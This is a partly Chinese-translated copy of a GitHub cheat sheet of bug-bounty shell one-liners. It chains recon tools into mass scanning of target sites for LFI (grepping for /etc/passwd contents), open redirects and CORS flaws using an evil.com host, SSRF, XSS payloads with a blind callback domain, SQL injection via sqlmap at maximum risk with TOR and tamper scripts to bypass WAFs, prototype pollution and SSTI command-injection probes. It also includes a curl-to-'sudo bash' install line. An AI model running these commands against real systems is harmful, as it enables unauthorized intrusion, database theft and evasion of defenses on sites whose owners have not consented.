[https://github.com/0xPugal/One-Liners](https://github.com/0xPugal/One-Liners)

# **漏洞赏金单行代码**

###### **感谢所有创造这些精彩单句台词的人❤️**

---

## ![图像][image1]

## **使用 pd 工具进行单线侦察**

subfinder \-d redacted.com \-all | anew subs.txt; shuffledns \-d redacted.com \-r resolvers.txt \-w n0kovo\_subdomains\_huge.txt | anew subs.txt; dnsx \-l subs.txt \-r resolvers.txt | anew resolved.txt; naabu \-l resolved.txt \-nmap \-rate 5000 | anew ports.txt; httpx \-l ports .txt | anew alive.txt; katana \-list alive.txt \-silent \-nc \-jc \-kf all \-fx \-xhr \-ef woff,css,png,svg,jpg,woff2,jpeg,gif,svg \-aff | anew urls.txt; nuclei \-l urls.txt \-es info,unknown \-ept ssl \-ss template-spray | anew nuclei.txt

# **子域名枚举**

\#\# Juicy Subdomains  
subfinder \-d target.com \-silent | dnsx \-silent | cut \-d ' ' \-f1  | grep \--color 'api\\|dev\\|stg\\|test\\|admin\\|demo\\|stage\\|pre\\|vpn'

\#\# from BufferOver.run  
curl \-s https://dns.bufferover.run/dns?q=.target.com | jq \-r .FDNS\_A\[\] | cut \-d',' \-f2 | sort \-u 

\#\# from Riddler.io

curl \-s "https://riddler.io/search/exportcsv?q=pld:target.com" | grep \-Po "((\[\\w.-\]\*)\\.(\[\\w\]\*)\\.(\[A-z\]))\\w+" | sort \-u 

\#\# from RedHunt Labs Recon API  
curl \--request GET \--url 'https://reconapi.redhuntlabs.com/community/v1/domains/subdomains?domain=\<target.com\>\&page\_size=1000' \--header 'X-BLOBR-KEY: API\_KEY' | jq '.subdomains\[\]' \-r

\#\# from nmap  
nmap \--script hostmap-crtsh.nse target.com

\#\# from CertSpotter  
curl \-s "https://api.certspotter.com/v1/issuances?domain=target.com\&include\_subdomains=true\&expand=dns\_names" | jq .\[\].dns\_names | grep \-Po "((\[\\w.-\]\*)\\.(\[\\w\]\*)\\.(\[A-z\]))\\w+" | sort \-u

\#\# from Archive  
curl \-s "http://web.archive.org/cdx/search/cdx?url=\*.target.com/\*\&output=text\&fl=original\&collapse=urlkey" | sed \-e 's\_https\*://\_\_' \-e "s/\\/.\*//" | sort \-u

\#\# from JLDC  
curl \-s "https://jldc.me/anubis/subdomains/target.com" | grep \-Po "((http|https):\\/\\/)?((\[\\w.-\]\*)\\.(\[\\w\]\*)\\.(\[A-z\]))\\w+" | sort \-u

\#\# from crt.sh  
curl \-s "https://crt.sh/?q=%25.target.com\&output=json" | jq \-r '.\[\].name\_value' | sed 's/\\\*\\.//g' | sort \-u

\#\# from ThreatMiner  
curl \-s "https://api.threatminer.org/v2/domain.php?q=target.com\&rt=5" | jq \-r '.results\[\]' |grep \-o "\\w.\*target.com" | sort \-u

\#\# from Anubis  
curl \-s "https://jldc.me/anubis/subdomains/target.com" | jq \-r '.' | grep \-o "\\w.\*target.com"

\#\# from ThreatCrowd  
curl \-s "https://www.threatcrowd.org/searchApi/v2/domain/report/?domain=target.com" | jq \-r '.subdomains' | grep \-o "\\w.\*target.com"

\#\# from HackerTarget  
curl \-s "https://api.hackertarget.com/hostsearch/?q=target.com"

\#\# from AlienVault  
curl \-s "https://otx.alienvault.com/api/v1/indicators/domain/tesla.com/url\_list?limit=100\&page=1" | grep \-o '"hostname": \*"\[^"\]\*' | sed 's/"hostname": "//' | sort \-u

\#\# from Censys  
censys subdomains target.com

\#\# from subdomain center  
curl "https://api.subdomain.center/?domain=target.com" | jq \-r '.\[\]' | sort \-u

---

## **低频信号：**

cat targets.txt | (gau || hakrawler || waybackurls || katana) |  grep "=" |  dedupe | httpx \-silent \-paths lfi\_wordlist.txt \-threads 100 \-random-agent \-x GET,POST \-status-code \-follow-redirects \-mc 200 \-mr "root:\[x\*\]:0:0:"

---

## **打开重定向：**

echo target.com | (gau || hakrawler || waybackurls || katana) | grep \-a \-i \\=http | qsreplace 'http://evil.com' | while read host do;do curl \-s \-L $host \-I | grep "http://evil.com" && echo \-e "$host \\033\[0;31mVulnerable\\n" ;done

cat subs.txt | (gau || hakrawler || waybackurls || katana) | grep "=" | dedupe | qsreplace 'http://example.com' | httpx \-fr \-title \-match-string 'Example Domain'

---

## **SSRF：**

cat urls.txt | grep "=" | qsreplace "burpcollaborator\_link" \>\> tmp-ssrf.txt; httpx \-silent \-l tmp-ssrf.txt \-fr 

---

## **XSS：**

### **诺克斯大规模狩猎**

file=$1; key="API\_KEY"; while read line; do curl https://api.knoxss.pro \-d target=$line \-H "X-API-KEY: $key" \-s | grep PoC; done \< $file

cat domains.txt | (gau || hakrawler || waybackurls || katana) | grep \-Ev "\\.(jpeg|jpg|png|ico|gif|css|woff|svg)$" | uro | grep \=  | qsreplace "\<img src=x onerror=alert(1)\>" | httpx \-silent \-nc \-mc 200 \-mr "\<img src=x onerror=alert(1)\>"

cat targets.txt | (gau || hakrawler || waybackurls || katana) | httpx \-silent | Gxss \-c 100 \-p Xss | grep "URL" | cut \-d '"' \-f2 | sort \-u | dalfox pipe

echo target.com | (gau || hakrawler || waybackurls || katana) | grep '=' |qsreplace '"\>\<script\>alert(1)\</script\>' | while read host do ; do curl \-s \--path-as-is \--insecure "$host" | grep \-qs "\<script\>alert(1)\</script\>" && echo "$host \\033\[0;31m" Vulnerable;done

cat urls.txt | grep "=" | sed 's/=.\*/=/' | sed 's/URL: //' | tee testxss.txt ; dalfox file testxss.txt \-b yours.xss.ht

cat subs.txt | awk '{print $3}'| httpx \-silent | xargs \-I@ sh \-c 'python3 http://xsstrike.py \-u @ \--crawl'

---

## **隐藏目录：**

dirsearch \-l ips\_alive \--full-url \--recursive \--exclude-sizes=0B \--random-agent \-e 7z,archive,ashx,asp,aspx,back,backup,backup-sql,backup.db,backup.sql,bak,bak.zip,bakup,bin,bkp,bson,bz2,core,csv,data,dataset,db,db-backup,db-dump,db.7z,db.bz2,db.gz,db.tar,db.tar.gz,db.zip,dbs.bz2,dll,dmp,dump,dump.7z,dump.db,dump.z,dump.zip,exported,gdb,gdb.dump,gz,gzip,ib,ibd,iso,jar,java,json,jsp,jspf,jspx,ldf,log,lz,lz4,lzh,mongo,neo4j,old,pg.dump,phtm,phtml,psql,rar,rb,rdb,rdb.bz2,rdb.gz,rdb.tar,rdb.tar.gz,rdb.zip,redis,save,sde,sdf,snap,sql,sql.7z,sql.bak,sql.bz2,sql.db,sql.dump,sql.gz,sql.lz,sql.rar,sql.tar.gz,sql.tar.z,sql.xz,sql.z,sql.zip,sqlite,sqlite.bz2,sqlite.gz,sqlite.tar,sqlite.tar.gz,sqlite.zip,sqlite3,sqlitedb,swp,tar,tar.bz2,tar.gz,tar.z,temp,tml,vbk,vhd,war,xhtml,xml,xz,z,zip,conf,config,bak,backup,swp,old,db,sql,asp,aspx\~,asp\~,py,py\~,rb\~,php,php\~,bkp,cache,cgi,inc,js,json,jsp\~,lock,wadl \-o output.txt

ffuf \-c \-w urls.txt:URL \-w wordlist.txt:FUZZ \-u URL/FUZZ \-mc all \-fc 500,502 \-ac \-recursion \-v \-of json \-o output.json

## **ffuf json 转 txt 输出**

cat output.json | jq | grep \-o '"url": "http\[^"\]\*"' | grep \-o 'http\[^"\]\*' | anew out.txt

从 Wayback 搜索敏感文件

echo target.com | (gau || hakrawler || waybackurls || katana) | grep \-color \-E ".xls | \\\\. xml | \\\\.xlsx | \\\\.json | \\\\. pdf | \\\\.sql | \\\\. doc| \\\\.docx | \\\\. pptx| \\\\.txt| \\\\.zip| \\\\.tar.gz| \\\\.tgz| \\\\.bak| \\\\.7z| \\\\.rar"

---

## **SQL注入：**

cat subs.txt | (gau || hakrawler || katana || waybckurls) | grep "=" | dedupe | anew tmp-sqli.txt && sqlmap \-m tmp-sqli.txt \--batch \--random-agent \--level 5 \--risk 3 \--dbs &&  
for i in $(cat tmp-sqli.txt); do ghauri \-u "$i" \--level 3 \--dbs \--current-db \--batch \--confirm; done

*使用 TOR 绕过 WAF*

sqlmap \-r request.txt \--time-sec=10 \--tor \--tor-type=SOCKS5 \--check-tor \--dbs \--random-agent \--tamper=space2comment

*在 sqlmap/ghauri 的输出文件夹中查找哪个主机存在漏洞* `root@bb:~/.local/share/sqlmap/output#`

find \-type f \-name "log" \-exec sh \-c 'grep \-q "Parameter" "{}" && echo "{}: SQLi"' \\;

---

## **CORS：**

echo target.com | (gau || hakrawler || waybackurls || katana) | while read url;do target=$(curl \-s \-I \-H "Origin: https://evil.com" \-X GET $url) | if grep 'https://evil.com'; then \[Potentional CORS Found\]echo $url;else echo Nothing on "$url";fi;done

---

## **原型污染：**

subfinder \-d target.com \-all \-silent | httpx \-silent \-threads 100 | anew alive.txt && sed 's/$/\\/?\_\_proto\_\_\[testparam\]=exploit\\//' alive.txt | page-fetch \-j 'window.testparam \== "exploit"? "\[VULNERABLE\]" : "\[NOT VULNERABLE\]"' | sed "s/(//g" | sed "s/)//g" | sed "s/JS //g" | grep "VULNERABLE"

---

## **JS 文件：**

### **查找 JS 文件：**

cat target.txt | (gau || hakrawler || waybackurls || katana) | grep \-i \-E "\\.js" | egrep \-v "\\.json|\\.jsp" | anew js.txt

while read \-r url; do  
  if curl \-s \-o /dev/null \-w "%{http\_code}" "$url" | grep \-q 200 && \\  
     curl \-s \-I "$url" | grep \-iq 'Content-Type:.\*\\(text/javascript\\|application/javascript\\)'; then  
    echo "$url"  
  fi  
done \< urls.txt \> js.txt

### **JS 中的隐藏参数：**

cat subs.txt | (gau || hakrawler || waybackurls || katana) | sort \-u | httpx \-silent \-threads 100 | grep \-Eiv '(.eot|.jpg|.jpeg|.gif|.css|.tif|.tiff|.png|.ttf|.otf|.woff|.woff2|.ico|.svg|.txt|.pdf)' | while read url; do vars=$(curl \-s $url | grep \-Eo "var \[a-zA-Z0-9\]+" | sed \-e 's,'var','"$url"?',g' \-e 's/ //g' | grep \-Eiv '\\.js$|(\[^.\]+)\\.js|(\[^.\]+)\\.js\\.\[0-9\]+$|(\[^.\]+)\\.js\[0-9\]+$|(\[^.\]+)\\.js\[a-z\]\[A-Z\]\[0-9\]+$' | sed 's/.\*/&=FUZZ/g'); echo \-e "\\e\[1;33m$url\\e\[1;32m$vars";done

### **提取 JS 中的敏感端点：**

cat main.js | grep \-oh "\\"\\/\[a-zA-Z0-9\_/?=&\]\*\\"" | sed \-e 's/^"//' \-e 's/"$//' | sort \-u

---

### **SSTI：**

for url in $(cat targets.txt); do python3 tplmap.py \-u $url; print $url; done

echo target.com | gau \--subs \--threads 200 | httpx \-silent \-mc 200 \-nc | qsreplace “aaa%20%7C%7C%20id%3B%20x” \> fuzzing.txt && ffuf \-ac \-u FUZZ \-w fuzzing.txt \-replay-proxy 127.0.0.1:8080

---

## **扫描 IP**

cat my\_ips.txt | xargs \-L 100 shodan scan submit \--wait 0

## **使用 Nuclei 截屏**

nuclei \-l target.txt \-headless \-t nuclei-templates/headless/screenshot.yaml \-v

## **SQLmap 篡改脚本 \- 绕过 WAF**

sqlmap \-u 'http://www.site.com/search.cmd?form\_state=1' \--level=5 \--risk=3 \--tamper=apostrophemask,apostrophenullencode,base64encode,between,chardoubleencode,charencode,charunicodeencode,equaltolike,greatest,ifnull2ifisnull,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,space2comment,space2plus,space2randomblank,unionalltounion,unmagicquotes \--no-cast \--no-escape \--dbs \--random-agent

## **Shodan 客户端**

shodan search Ssl.cert.subject.CN:"target.com" \--fields ip\_str | anew ips.txt

### **Ffuf.json 仅改为 ffuf-url.txt**

cat ffuf.json | jq | grep "url" | sed 's/"//g' | sed 's/url://g' | sed 's/^ \*//' | sed 's/,//g'

## **更新 golang**

curl https://raw.githubusercontent.com/udhos/update-golang/master/update-golang.sh | sudo bash

## **Censys CLI**

censys search "target.com" \--index-type hosts | jq \-c '.\[\] | {ip: .ip}' | grep \-oE '\[0-9\]+\\.\[0-9\]+\\.\[0-9\]+\\.\[0-9\]+'

## **Nmap cidr 到 ips.txt**

cat cidr.txt | xargs \-I @ sh \-c 'nmap \-v \-sn @ | egrep \-v "host down" | grep "Nmap scan report for" | sed 's/Nmap scan report for //g' | anew nmap-ips.txt'

### **Xray URL 扫描**

for i in $(cat subs.txt); do ./xray\_linux\_amd64 ws \--basic-crawler $i \--plugins xss,sqldet,xxe,ssrf,cmd-injection,path-traversal \--ho $(date \+"%T").html ; done

### **grep 仅核信息**

result=$(sed \-n 's/^\\(\[^ \]\*\\) \\(\[^ \]\*\\) \\(\[^ \]\*\\) \\(\[^ \]\*\\).\*/\\1 \\2 \\3 \\4/p' file.txt)  
echo "$result"

`[sqli-error-based:oracle] [http] [critical] https://test.com/en/events/e5?utm_source=test'&utm_medium=FUZZ'`

### **下载 js 文件**

\#\# curl  
mkdir \-p js\_files; while IFS= read \-r url || \[ \-n "$url" \]; do filename=$(basename "$url"); echo "Downloading $filename JS..."; curl \-sSL "$url" \-o "downloaded\_js\_files/$filename"; done \< "$1"; echo "Download complete."

\#\# wget  
sed \-i 's/\\r//' js.txt && for i in $(cat js.txt); do wget "$i"; done

### **仅过滤 xss 的 html/xml 内容类型**

cat urls.txt | httpx \-ct \-silent \-mc 200 \-nc | grep \-i \-E "text/html|text/xml" | cut \-d '\[' \-f 1 | anew xml\_html.txt

\#\# using curl  
while read \-r url; do  
  if curl \-s \-o /dev/null \-w "%{http\_code}" "$url" | grep \-q 200 && \\  
     curl \-s \-I "$url" | grep \-iq 'Content-Type:.\*text/\\(html\\|xml\\)'; then  
    echo "$url"  
  fi  
done \< urls.txt \> xml\_html.txt

### **获取网站图标哈希**

curl https://favicon-hash.kmsec.uk/api/?url=https://test.com/favicon.ico | jq

### **根据核心模板构建单词表**

for i in \`grep \-R yaml | awk \-F: '{print $1}'\`; do cat $i | grep 'BaseURL}}/' | awk \-F '{{BaseURL}}' '{print $2}' | sed 's/"//g' | sed "s/'//g"; done

### **查找依赖项混淆（confused）**

\[ \-f "urls.txt" \] && mkdir \-p downloaded\_json && while read \-r url; do wget \-q "$url" \-O "downloaded\_json/$(basename "$url")" && scan\_output=$(confused \-l npm "downloaded\_json/$(basename "$url")") && echo "$scan\_output" | grep \-q "Issues found" && echo "Vulnerability found in: $(basename "$url")" || echo "No vulnerability found in: $(basename "$url")"; done \< \<(cat urls.txt)

### **使用 x8 查找参数**

subdomain \-d target.com \-silent \-all \-recursive | httpx \-silent | sed \-s 's/$/\\//' | xargs \-I@ sh \-c 'x8 \-u @ \-w parameters.txt \-o output.txt'

### **查找 xss \- [xss0r的反射参数](https://raw.githubusercontent.com/xss0r/xssorRecon/refs/heads/main/reflection.py)**

python3 reflection.py urls.txt | grep "Reflection found" | awk \-F'\[?&\]' '\!seen\[$2\]++' | tee reflected.txt

[image1]: https://user-images.githubusercontent.com/75373225/180003557-59bf909e-95e5-4b31-b4f8-fc05532f9f7c.png
